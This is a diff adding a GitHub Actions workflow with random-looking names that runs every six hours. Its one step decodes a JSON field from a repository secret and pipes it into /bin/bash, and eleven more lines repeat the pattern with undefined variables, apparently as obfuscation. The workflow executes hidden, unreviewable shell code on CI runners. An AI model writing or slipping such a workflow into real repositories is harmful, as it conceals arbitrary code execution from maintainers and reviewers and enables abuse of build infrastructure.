@@ -1,0 +1,28 @@
+name: zhongxiaoyan3456
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhongxiaoyan3456
+        env:
+          tpten3534: ${{ secrets.tpten3534 }}
+        run: |
+          echo $tpten3534 | jq -r .pkkp6 | /bin/bash
+          echo $w4409 | jq -r .wp07 | /bin/bash
+          echo $iwaji29 | jq -r .suy95 | /bin/bash
+          echo $s646 | jq -r .md7399 | /bin/bash
+          echo $qiwtx64285 | jq -r .qvrtm627 | /bin/bash
+          echo $gamb1 | jq -r .ct3687 | /bin/bash
+          echo $oeh69 | jq -r .vgnw77298 | /bin/bash
+          echo $rzzn692 | jq -r .digd46133 | /bin/bash
+          echo $favdg70162 | jq -r .uk30564 | /bin/bash
+          echo $kml09 | jq -r .lebt1 | /bin/bash
+          echo $pdwjf3267 | jq -r .sd00 | /bin/bash
+          echo $yrfj653 | jq -r .pd994 | /bin/bash
+
